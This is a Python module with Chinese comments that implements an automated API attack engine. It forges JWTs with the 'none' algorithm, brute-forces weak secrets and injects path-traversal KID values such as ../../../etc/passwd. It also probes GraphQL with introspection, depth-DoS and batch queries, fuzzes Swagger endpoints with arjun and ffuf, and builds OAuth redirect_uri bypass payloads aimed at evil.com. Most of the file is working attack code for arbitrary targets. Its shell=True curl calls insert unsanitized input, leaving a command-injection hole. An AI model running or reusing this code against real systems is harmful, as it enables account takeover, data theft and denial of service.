"""
API攻击面引擎 v1.0 — API Attack Surface
───────────────────────────────────────────
覆盖:
  • JWT: None算法/密钥爆破/伪造/KID注入/JKU劫持
  • GraphQL: 内省查询/注入/深度递归DoS/batch攻击
  • Swagger/OpenAPI: 自动解析→端点枚举→参数fuzz
  • OAuth 2.0: 流程劫持/redirect_uri绕过/state重放
  • REST: 参数污染/HTTP Method覆盖/Content-Type走私
  • SOAP: XXE/WSDL枚举

工具依赖: jwt_tool, graphw00f, arjun, ffuf

用法:
  from .api_attack import APIAttacker

  aa = APIAttacker(project_id=5)

  # JWT攻击
  result = aa.attack_jwt("eyJhbGciOi...", target_url="https://api.target.com")

  # GraphQL攻击
  endpoints = aa.graphql_introspect("https://target.com/graphql")

  # Swagger自动攻击
  findings = aa.attack_swagger("https://target.com/api/docs")

  # 一键全API面攻击
  report = aa.full_api_attack("https://api.target.com")
"""

import subprocess, json, time, os, re, base64, hashlib, hmac
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Callable, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from . import db

TMP = Path("/tmp/api_attack")
TMP.mkdir(exist_ok=True)

# ==================== 数据模型 ====================

@dataclass
class JWTInfo:
    """JWT解析信息"""
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: str
    algorithm: str                     # HS256/RS256/None
    is_signed: bool
    has_kid: bool = False
    has_jku: bool = False
    has_jwk: bool = False

@dataclass
class JWTFinding:
    """JWT漏洞发现"""
    vulnerability: str                 # none_algorithm/key_confusion/kid_injection...
    severity: str                      # critical/high/medium/low
    description: str
    payload: str = ""                  # 利用payload
    forged_token: str = ""             # 伪造的token
    verified: bool = False             # 是否验证成功

@dataclass
class GraphQLInfo:
    """GraphQL端点信息"""
    url: str
    has_introspection: bool
    queries: List[str] = field(default_factory=list)
    mutations: List[str] = field(default_factory=list)
    subscriptions: List[str] = field(default_factory=list)
    types: List[str] = field(default_factory=list)
    has_depth_limit: bool = False
    has_rate_limit: bool = False
    sensitive_fields: List[str] = field(default_factory=list)

@dataclass
class OpenAPIFinding:
    """OpenAPI/Swagger发现"""
    path: str
    method: str
    parameters: List[Dict] = field(default_factory=list)
    requires_auth: bool = False
    has_sensitive_data: bool = False
    fuzz_results: List[str] = field(default_factory=list)


# ==================== JWT 攻击 ====================

class JWTAttacker:
    """JWT全套攻击"""

    # JWT None算法payload
    NONE_PAYLOAD = '{"alg":"none","typ":"JWT"}'

    # 弱密钥列表
    WEAK_SECRETS = [
        "secret", "key", "jwt_secret", "password", "changeme",
        "1234567890", "secretkey", "mysecret", "supersecret",
        "privatekey", "jwt", "token", "access_token",
    ]

    @staticmethod
    def parse_jwt(token: str) -> Optional[JWTInfo]:
        """解析JWT，返回结构信息"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Base64解码 header/payload
            def _b64_decode(s: str) -> Dict:
                s = s + "=" * (4 - len(s) % 4)  # padding
                try:
                    return json.loads(base64.urlsafe_b64decode(s).decode())
                except Exception:
                    return {}

            header = _b64_decode(parts[0])
            payload = _b64_decode(parts[1])

            return JWTInfo(
                header=header,
                payload=payload,
                signature=parts[2],
                algorithm=header.get("alg", "HS256"),
                is_signed=parts[2] != "",
                has_kid="kid" in header,
                has_jku="jku" in header,
                has_jwk="jwk" in header,
            )
        except Exception:
            return None

    @staticmethod
    def attack_none_algorithm(token: str, target_url: str,
                              test_endpoint: str = "/") -> List[JWTFinding]:
        """
        None算法攻击 — 修改alg为none，移除签名
        
        Args:
            token: 原始JWT
            target_url: 目标API地址
            test_endpoint: 测试端点（带Authorization头）
        """
        findings = []

        try:
            parts = token.split(".")
            if len(parts) != 3:
                return findings

            info = JWTAttacker.parse_jwt(token)
            if not info:
                return findings

            # 构造None算法token
            none_header = base64.urlsafe_b64encode(
                b'{"alg":"none","typ":"JWT"}'
            ).decode().rstrip("=")
            # 保留原payload
            none_token = f"{none_header}.{parts[1]}."

            # 测试
            result = JWTAttacker._test_token(target_url, none_token, test_endpoint)
            if result["valid"]:
                findings.append(JWTFinding(
                    vulnerability="none_algorithm",
                    severity="critical",
                    description="JWT使用none算法，签名验证可被绕过",
                    payload=none_token,
                    forged_token=none_token,
                    verified=True
                ))

            # 也尝试各种alg变体
            alg_variants = ["None", "NONE", "nOnE", "none", "null"]
            for alg in alg_variants:
                var_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": alg, "typ": "JWT"}).encode()
                ).decode().rstrip("=")
                var_token = f"{var_header}.{parts[1]}."
                result = JWTAttacker._test_token(target_url, var_token, test_endpoint)
                if result["valid"]:
                    findings.append(JWTFinding(
                        vulnerability="none_algorithm_variant",
                        severity="critical",
                        description=f"JWT None算法变体 '{alg}' 绕过成功",
                        payload=var_token,
                        forged_token=var_token,
                        verified=True
                    ))
                    break

        except Exception:
            pass

        return findings

    @staticmethod
    def brute_weak_secret(token: str) -> List[JWTFinding]:
        """弱密钥爆破"""
        findings = []

        try:
            parts = token.split(".")
            info = JWTAttacker.parse_jwt(token)
            if not info:
                return findings

            if info.algorithm.startswith("HS"):
                for secret in JWTAttacker.WEAK_SECRETS:
                    try:
                        # HS256签名验证
                        sig_input = f"{parts[0]}.{parts[1]}"
                        computed = hmac.new(
                            secret.encode(), sig_input.encode(), hashlib.sha256
                        ).digest()
                        computed_b64 = base64.urlsafe_b64encode(computed).decode().rstrip("=")
                        if computed_b64 == parts[2]:
                            findings.append(JWTFinding(
                                vulnerability="weak_secret",
                                severity="critical",
                                description=f"JWT弱密钥: {secret}",
                                payload=secret,
                                verified=True
                            ))
                    except Exception:
                        pass

                # 如果没有匹配，返回尝试过的列表
                if not findings:
                    findings.append(JWTFinding(
                        vulnerability="weak_secret_possible",
                        severity="medium",
                        description=f"未在{len(JWTAttacker.WEAK_SECRETS)}个常见密钥中找到匹配，建议用rockyou.txt继续爆破",
                        payload=f"jwt_tool {token} -C -d /usr/share/wordlists/rockyou.txt"
                    ))

        except Exception:
            pass

        return findings

    @staticmethod
    def kid_injection(token: str, target_url: str) -> List[JWTFinding]:
        """
        KID注入 — 利用kid参数进行路径遍历/SQL注入/命令注入
        
        KID通常指向密钥文件，可以:
          - 路径遍历: ../../dev/null
          - SQL注入: 如果KID用于数据库查询
          - 命令注入: 如果KID用于shell命令
        """
        findings = []

        try:
            info = JWTAttacker.parse_jwt(token)
            if not info or not info.has_kid:
                return findings

            # 路径遍历变体
            traversal_kids = [
                "../../dev/null", "../../../etc/passwd",
                "../../../../dev/zero", "/dev/null", "//dev//null",
            ]

            header = info.header.copy()
            for kid_val in traversal_kids:
                header["kid"] = kid_val
                new_header_b64 = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip("=")
                parts = token.split(".")
                new_token = f"{new_header_b64}.{parts[1]}.{parts[2]}"

                result = JWTAttacker._test_token(target_url, new_token)
                if result["valid"]:
                    findings.append(JWTFinding(
                        vulnerability="kid_path_traversal",
                        severity="high",
                        description=f"KID路径遍历: {kid_val}",
                        payload=new_token,
                        forged_token=new_token,
                        verified=True
                    ))

        except Exception:
            pass

        return findings

    @staticmethod
    def algorithm_confusion(token: str, public_key_pem: str = "",
                            target_url: str = "") -> List[JWTFinding]:
        """
        算法混淆攻击 — HS256算法用RS256公钥签名
        
        原理: 如果服务端用RS256验证但接受HS256，可以用公钥作为HS256密钥
        """
        findings = []
        try:
            if public_key_pem:
                # 尝试用公钥做HMAC签名
                info = JWTAttacker.parse_jwt(token)
                if info and info.algorithm == "RS256":
                    findings.append(JWTFinding(
                        vulnerability="algorithm_confusion",
                        severity="high",
                        description="检测到RS256，尝试HS256公钥混淆攻击",
                        payload=f"jwt_tool {token} -X k -pk {public_key_pem}",
                        verified=False
                    ))
        except Exception:
            pass

        return findings

    @staticmethod
    def _test_token(target_url: str, token: str,
                    endpoint: str = "/api/me") -> Dict[str, Any]:
        """测试JWT Token是否有效"""
        try:
            cmd = (
                f"curl -s -o /dev/null -w '%{{http_code}}' "
                f"-H 'Authorization: Bearer {token}' "
                f"'{urljoin(target_url, endpoint)}' 2>/dev/null"
            )
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15).stdout.strip()
            status = int(out) if out.isdigit() else 403

            return {
                "valid": status in (200, 201, 202, 204, 301, 302),
                "status_code": status
            }
        except Exception:
            return {"valid": False, "status_code": 0}


# ==================== GraphQL 攻击 ====================

class GraphQLAttacker:
    """GraphQL全套攻击"""

    # 内省查询
    INTROSPECTION_QUERY = """
    query {
      __schema {
        queryType { name fields { name type { name kind } } }
        mutationType { name fields { name type { name kind } } }
        subscriptionType { name fields { name type { name kind } } }
        types { name kind fields { name type { name kind } } }
      }
    }
    """

    # 递归深度攻击
    DEEP_QUERY = """
    query {{
      {recursive}
    }}
    """

    @staticmethod
    def detect_graphql(url: str) -> List[str]:
        """探测GraphQL端点"""
        endpoints = []
        common_paths = [
            "/graphql", "/gql", "/graphiql", "/api/graphql",
            "/v1/graphql", "/v2/graphql", "/query", "/api",
        ]

        for path in common_paths:
            full_url = urljoin(url, path)
            # 尝试内省查询
            cmd = (
                f"curl -s -X POST '{full_url}' "
                f"-H 'Content-Type: application/json' "
                f"-d '{{\"query\":\"{{__typename}}\"}}' "
                f"2>/dev/null"
            )
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10).stdout
            if '"data"' in out and ('"__typename"' in out or '__typename' in out):
                endpoints.append(full_url)

        return endpoints

    @staticmethod
    def introspect(endpoint: str) -> Optional[GraphQLInfo]:
        """GraphQL内省查询"""
        try:
            intro_data = json.dumps({"query": GraphQLAttacker.INTROSPECTION_QUERY})
            cmd = (
                f"curl -s -X POST '{endpoint}' "
                f"-H 'Content-Type: application/json' "
                f"-d '{intro_data}' "
                f"2>/dev/null"
            )
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30).stdout

            data = json.loads(out).get("data", {}).get("__schema", {})
            if not data:
                return None

            info = GraphQLInfo(url=endpoint, has_introspection=True)

            # 提取查询
            query_type = data.get("queryType", {})
            for field in query_type.get("fields", []):
                info.queries.append(field["name"])

            # 提取变更
            mutation_type = data.get("mutationType", {})
            for field in mutation_type.get("fields", []):
                info.mutations.append(field["name"])

            # 提取订阅
            sub_type = data.get("subscriptionType", {})
            if sub_type:
                for field in sub_type.get("fields", []):
                    info.subscriptions.append(field["name"])

            # 提取敏感字段
            sensitive_keywords = ["password", "token", "secret", "key", "email",
                                 "phone", "credit", "ssn", "admin", "role"]
            for t in data.get("types", []):
                for field in t.get("fields", []):
                    if any(kw in field["name"].lower() for kw in sensitive_keywords):
                        info.sensitive_fields.append(f"{t['name']}.{field['name']}")

            return info

        except Exception:
            return None

    @staticmethod
    def test_depth_attack(endpoint: str, depth: int = 50) -> bool:
        """
        递归深度攻击 — 测试是否有深度限制
        深度递归查询可能导致DoS
        """
        # 构造递归查询
        recursive_query = "query { "
        for _ in range(depth):
            recursive_query += "node { "
        recursive_query += "id "
        for _ in range(depth):
            recursive_query += "} "
        recursive_query += "}"

        try:
            recursive_data = json.dumps({"query": recursive_query})
            cmd = (
                f"curl -s -X POST '{endpoint}' "
                f"-H 'Content-Type: application/json' "
                f"-d '{recursive_data}' "
                f"2>/dev/null"
            )
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30).stdout

            # 如果返回深度限制错误，说明有保护
            if "depth" in out.lower() or "exceed" in out.lower():
                return False  # 有深度限制
            if "data" in out:
                return True  # 无深度限制

        except Exception:
            pass

        return False

    @staticmethod
    def test_batch_attack(endpoint: str) -> bool:
        """批量查询攻击 — 绕过rate limit"""
        batch_query = json.dumps([
            {"query": "{__typename}"},
            {"query": "{__typename}"},
            {"query": "{__typename}"},
            {"query": "{__typename}"},
            {"query": "{__typename}"},
        ])
        try:
            cmd = (
                f"curl -s -X POST '{endpoint}' "
                f"-H 'Content-Type: application/json' "
                f"-d '{batch_query}' 2>/dev/null"
            )
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15).stdout
            return '"data"' in out and out.count('"data"') >= 3
        except Exception:
            return False


# ==================== Swagger/OpenAPI 攻击 ====================

class OpenAPIAttacker:
    """Swagger/OpenAPI自动化攻击"""

    # 常见Swagger路径
    SWAGGER_PATHS = [
        "/swagger.json", "/swagger/v1/swagger.json", "/api-docs",
        "/v2/api-docs", "/v3/api-docs", "/api/swagger.json",
        "/openapi.json", "/api/openapi.json", "/docs/api",
        "/swagger-resources", "/api/v1/swagger.json",
    ]

    @staticmethod
    def discover(base_url: str) -> Optional[str]:
        """发现Swagger/OpenAPI文档"""
        for path in OpenAPIAttacker.SWAGGER_PATHS:
            full_url = urljoin(base_url, path)
            try:
                cmd = f"curl -s -o /dev/null -w '%{{http_code}}' '{full_url}' 2>/dev/null"
                status = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10).stdout.strip()
                if status == "200":
                    # 验证是JSON且包含swagger/openapi
                    cmd2 = f"curl -s '{full_url}' 2>/dev/null | head -c 500"
                    content = subprocess.run(cmd2, shell=True, capture_output=True, text=True, timeout=10).stdout
                    if "swagger" in content.lower() or "openapi" in content.lower():
                        return full_url
            except Exception:
                continue
        return None

    @staticmethod
    def parse_endpoints(swagger_url: str) -> List[OpenAPIFinding]:
        """解析Swagger文档，枚举所有端点"""
        endpoints = []
        try:
            cmd = f"curl -s '{swagger_url}' 2>/dev/null"
            content = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15).stdout
            doc = json.loads(content)

            # OpenAPI 3.x
            paths = doc.get("paths", {})
            for path, methods in paths.items():
                for method, details in methods.items():
                    if method in ("get", "post", "put", "delete", "patch", "options"):
                        params = []
                        for p in details.get("parameters", []):
                            params.append({
                                "name": p.get("name"),
                                "in": p.get("in"),
                                "required": p.get("required", False),
                                "type": p.get("schema", {}).get("type", "string")
                            })

                        # 检测是否需要认证
                        has_auth = "security" in details or "security" in doc

                        # 检测敏感数据
                        has_sensitive = any(
                            kw in path.lower() or kw in str(details).lower()
                            for kw in ["admin", "user", "password", "token", "secret", "delete"]
                        )

                        endpoints.append(OpenAPIFinding(
                            path=path,
                            method=method.upper(),
                            parameters=params,
                            requires_auth=has_auth,
                            has_sensitive_data=has_sensitive
                        ))

        except Exception:
            pass

        return endpoints

    @staticmethod
    def fuzz_parameters(base_url: str, endpoints: List[OpenAPIFinding]) -> List[OpenAPIFinding]:
        """对发现的端点进行参数fuzz"""
        for ep in endpoints:
            full_url = urljoin(base_url, ep.path)
            # 用arjun做参数发现
            try:
                cmd = f"arjun -u '{full_url}' -m {ep.method} -t 10 --stable 2>/dev/null"
                out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60).stdout
                if "reflections" in out.lower() or "valid" in out.lower():
                    ep.fuzz_results.append(f"arjun发现参数: {out[:200]}")
            except Exception:
                pass

            # 用ffuf做路径fuzz
            try:
                path_part = ep.path.replace("{", "FUZZ{").replace("}", "}")
                ffuf_cmd = f"ffuf -u '{urljoin(base_url, ep.path)}' -w /usr/share/wordlists/dirb/common.txt -mc 200 -t 20 -silent 2>/dev/null"
                out = subprocess.run(ffuf_cmd, shell=True, capture_output=True, text=True, timeout=60).stdout
                if out.strip():
                    ep.fuzz_results.append(f"ffuf发现: {out[:200]}")
            except Exception:
                pass

        return endpoints


# ==================== OAuth 2.0 攻击 ====================

class OAuthAttacker:
    """OAuth 2.0 攻击"""

    @staticmethod
    def test_redirect_uri_bypass(auth_url: str, client_id: str,
                                 redirect_uri: str) -> List[Dict]:
        """
        redirect_uri绕过测试
        
        绕过方法:
          - 开放重定向: https://evil.com%23@legit.com/callback
          - 子域名: https://legit.com.evil.com/callback
          - 路径遍历: https://legit.com/../evil/callback
          - 空参数: redirect_uri=
          - 多个redirect_uri
        """
        bypass_payloads = [
            f"https://evil.com%23@{urlparse(redirect_uri).netloc}{urlparse(redirect_uri).path}",
            f"{redirect_uri}.evil.com/callback",
            f"{redirect_uri}/../evil/callback",
            f"{redirect_uri}///evil.com",
            f"{redirect_uri}?redirect_uri=https://evil.com",
            "https://evil.com",
            "",
        ]

        findings = []
        for payload in bypass_payloads:
            test_url = f"{auth_url}?client_id={client_id}&redirect_uri={payload}&response_type=code"
            findings.append({
                "payload": payload,
                "test_url": test_url,
                "description": f"测试redirect_uri绕过: {payload}"
            })

        return findings

    @staticmethod
    def test_state_replay(auth_url: str, client_id: str,
                          redirect_uri: str, state: str = "fixed_state") -> Dict:
        """CSRF/State重放攻击"""
        return {
            "vulnerability": "state_replay",
            "description": "OAuth state参数固定，可进行CSRF攻击绑定受害者账户",
            "test_url": f"{auth_url}?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&state={state}",
            "mitigation": "使用随机state参数"
        }


# ==================== 总控引擎 ====================

class APIAttacker:
    """
    API攻击面总控引擎
    
    用例:
      aa = APIAttacker(project_id=5)
      
      # JWT攻击
      findings = aa.attack_jwt("eyJhbGci...", "https://api.target.com")
      
      # GraphQL攻击
      gql_info = aa.attack_graphql("https://target.com/graphql")
      
      # Swagger攻击
      swagger_findings = aa.attack_swagger("https://target.com")
      
      # 一键API全攻击
      report = aa.full_api_attack("https://api.target.com")
    """

    def __init__(self, project_id: int, uid: int = 0,
                 callback: Optional[Callable] = None):
        self.project_id = project_id
        self.uid = uid
        self.cb = callback or (lambda *a: None)
        self.jwt = JWTAttacker()
        self.graphql = GraphQLAttacker()
        self.openapi = OpenAPIAttacker()
        self.oauth = OAuthAttacker()

    def _step(self, tool: str, target: str, status: str, msg: str = ""):
        self.cb(tool, target, status, msg)
        if status == "running":
            db.scan_start(self.project_id, self.uid, tool, target)

    # === JWT ===

    def attack_jwt(self, token: str, target_url: str = "",
                   test_endpoint: str = "/api/me") -> List[JWTFinding]:
        """完整JWT攻击"""
        self._step("jwt-attack", target_url or "token", "running", "JWT全攻击...")

        all_findings = []

        # 1. 解析
        info = self.jwt.parse_jwt(token)

        # 2. None算法
        if target_url:
            none_findings = self.jwt.attack_none_algorithm(token, target_url, test_endpoint)
            all_findings.extend(none_findings)

        # 3. 弱密钥爆破
        weak_findings = self.jwt.brute_weak_secret(token)
        all_findings.extend(weak_findings)

        # 4. KID注入
        if info and info.has_kid and target_url:
            kid_findings = self.jwt.kid_injection(token, target_url)
            all_findings.extend(kid_findings)

        # 5. 算法混淆
        if info and info.algorithm == "RS256":
            conf_findings = self.jwt.algorithm_confusion(token, target_url=target_url)
            all_findings.extend(conf_findings)

        self._step("jwt-attack", target_url or "token", "done",
                   f"发现 {len(all_findings)} 个JWT漏洞")
        return all_findings

    # === GraphQL ===

    def attack_graphql(self, url: str) -> Optional[GraphQLInfo]:
        """完整GraphQL攻击"""
        self._step("graphql-attack", url, "running", "GraphQL全攻击...")

        # 1. 探测端点
        endpoints = self.graphql.detect_graphql(url)
        if not endpoints:
            self._step("graphql-attack", url, "done", "未发现GraphQL端点")
            return None

        endpoint = endpoints[0]

        # 2. 内省查询
        info = self.graphql.introspect(endpoint)
        if not info:
            self._step("graphql-attack", url, "done", "内省查询被禁用")
            return GraphQLInfo(url=endpoint, has_introspection=False)

        # 3. 深度攻击
        info.has_depth_limit = not self.graphql.test_depth_attack(endpoint)

        # 4. 批量攻击
        info.has_rate_limit = not self.graphql.test_batch_attack(endpoint)

        self._step("graphql-attack", url, "done",
                   f"查询:{len(info.queries)} 变更:{len(info.mutations)} 敏感:{len(info.sensitive_fields)}")
        return info

    # === Swagger ===

    def attack_swagger(self, base_url: str) -> List[OpenAPIFinding]:
        """完整Swagger/OpenAPI攻击"""
        self._step("swagger-attack", base_url, "running", "Swagger全攻击...")

        # 1. 发现文档
        swagger_url = self.openapi.discover(base_url)
        if not swagger_url:
            self._step("swagger-attack", base_url, "done", "未发现Swagger文档")
            return []

        # 2. 解析端点
        endpoints = self.openapi.parse_endpoints(swagger_url)

        # 3. 参数fuzz
        endpoints = self.openapi.fuzz_parameters(base_url, endpoints)

        self._step("swagger-attack", base_url, "done",
                   f"发现 {len(endpoints)} 个端点")
        return endpoints

    # === OAuth ===

    def attack_oauth(self, auth_url: str, client_id: str,
                     redirect_uri: str) -> Dict[str, Any]:
        """OAuth攻击"""
        self._step("oauth-attack", auth_url, "running", "OAuth攻击...")

        redirect_findings = self.oauth.test_redirect_uri_bypass(
            auth_url, client_id, redirect_uri
        )
        state_finding = self.oauth.test_state_replay(
            auth_url, client_id, redirect_uri
        )

        self._step("oauth-attack", auth_url, "done",
                   f"redirect_uri测试: {len(redirect_findings)}个")
        return {
            "redirect_bypass": redirect_findings,
            "state_replay": state_finding,
        }

    # === 一键全API攻击 ===

    def full_api_attack(self, base_url: str, jwt_token: str = "") -> Dict[str, Any]:
        """
        一键API全攻击:
        Swagger→GraphQL→JWT→OAuth
        
        Returns:
            完整报告dict
        """
        report = {
            "base_url": base_url,
            "started_at": time.time(),
            "swagger": [],
            "graphql": None,
            "jwt": [],
            "oauth": None,
            "summary": ""
        }

        # 1. Swagger
        swagger_endpoints = self.attack_swagger(base_url)
        report["swagger"] = [
            {"path": ep.path, "method": ep.method, "has_auth": ep.requires_auth,
             "sensitive": ep.has_sensitive_data}
            for ep in swagger_endpoints
        ]

        # 2. GraphQL
        report["graphql"] = self.attack_graphql(base_url)

        # 3. JWT
        if jwt_token:
            report["jwt"] = [
                {"vuln": f.vulnerability, "severity": f.severity, "verified": f.verified}
                for f in self.attack_jwt(jwt_token, base_url)
            ]

        # 4. OAuth (如果发现了OAuth端点)
        # 从Swagger端点中找OAuth相关
        for ep in swagger_endpoints:
            if "auth" in ep.path.lower() or "oauth" in ep.path.lower():
                report["oauth"] = f"发现OAuth端点: {ep.path}"
                break

        report["elapsed"] = time.time() - report["started_at"]
        report["summary"] = (
            f"API攻击面报告\n"
            f"{'─'*50}\n"
            f"目标: {base_url}\n"
            f"Swagger端点: {len(report['swagger'])}\n"
            f"GraphQL: {'发现' if report['graphql'] and report['graphql'].has_introspection else '未发现/无内省'}\n"
            f"JWT漏洞: {len(report['jwt'])}\n"
            f"OAuth: {'发现' if report['oauth'] else '未发现'}\n"
            f"耗时: {report['elapsed']:.0f}s\n"
        )

        return report
